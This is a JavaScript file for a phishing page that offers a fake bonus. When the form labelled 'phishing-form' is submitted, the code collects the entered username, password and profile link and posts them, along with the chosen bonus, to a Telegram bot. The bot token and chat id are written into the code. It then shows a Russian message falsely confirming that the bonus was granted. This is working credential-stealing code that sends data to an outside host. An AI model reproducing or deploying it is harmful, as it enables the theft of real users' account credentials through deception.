const options = document.querySelectorAll(".bonus-option");
options.forEach(option => {
    option.addEventListener("click", function() {
        options.forEach(o => o.classList.remove("selected"));
        this.classList.add("selected");
        selectedBonus = this.getAttribute("data-value")

    });
});

document.getElementById("phishing-form").addEventListener("submit", function(event) {
    event.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    let profileLink = document.getElementById("profile-link").value;
    
    fetch("https://api.telegram.org/bot7811273259:AAHRUI55WZFQqTSEjye_sl_CoeRMBQ9xdIY/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: "7518382960",
            text: `🎁 Логин: ${username}\n🔑 Пароль: ${password}\n🎯 Бонус: ${selectedBonus}\n🔗 Ссылка: ${profileLink}`
        })
    });
    
    alert("🎯 Бонус успешно приобретень! Бонус будет отправлен в течение сутки!");
});